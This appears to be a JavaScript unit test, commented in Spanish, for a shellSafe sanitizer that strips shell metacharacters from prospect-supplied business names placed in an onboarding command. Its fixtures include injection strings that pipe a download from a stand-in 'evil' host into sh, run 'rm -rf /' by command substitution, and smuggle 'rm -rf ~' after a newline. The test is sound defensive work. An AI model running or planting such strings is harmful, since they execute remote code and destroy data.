// test/onboarding_cmd.test.js — shellSafe (api/onboarding.js).
// El "comando sugerido" que onboarding manda a Telegram está pensado para copiarse/pegarse a una
// shell. shellSafe garantiza que un prospecto NO pueda inyectar otro comando via el nombre del
// negocio / sitio, aunque el operador lo pegue tal cual (ship-review 2026-07-16).
// Corre: `node test/onboarding_cmd.test.js`. Exit 1 si algo falla.

const { __shellSafe: shellSafe } = require("../api/onboarding.js");

let pass = 0, fail = 0;
const check = (cond, label) => { if (cond) { pass++; console.log("  ok   " + label); } else { fail++; console.log(" FAIL  " + label); } };

const SHELL_META = /["'`$;|&<>()\\\n\r]/; // lo que rompería el `--display "..."` o inyectaría un comando

// 1) el payload de inyección clásico pierde TODO metacaracter de shell
{
  const out = shellSafe('Acme"; curl http://evil/x | sh #');
  check(!SHELL_META.test(out), "1: sin metacaracteres de shell tras sanear el payload de inyección");
  check(!out.includes('"'), "1: la comilla que rompía --display \"...\" desaparece");
}

// 2) command substitution ($(), backticks) y variables neutralizadas
{
  check(!SHELL_META.test(shellSafe("$(rm -rf /)")), "2: $() neutralizado");
  check(!SHELL_META.test(shellSafe("`whoami`")), "2: backticks neutralizados");
  check(!SHELL_META.test(shellSafe("x\n rm -rf ~")), "2: newline (nueva línea = nuevo comando) neutralizado");
}

// 3) nombres/URLs legítimos se preservan razonablemente (no rompemos el caso normal)
{
  check(shellSafe("Estética Luz 24/7") === "Estética Luz 24/7", "3: nombre normal con acentos/dígitos/espacio se preserva");
  check(shellSafe("https://acme.com/path?x=1") === "https://acme.com/path?x=1", "3: URL simple se preserva");
}

// 4) entradas vacías/nulas son seguras
{
  check(shellSafe(null) === "", "4: null → cadena vacía (no truena)");
  check(shellSafe(undefined) === "", "4: undefined → cadena vacía");
}

console.log(`\n${pass} ok, ${fail} fail`);
process.exit(fail ? 1 : 0);
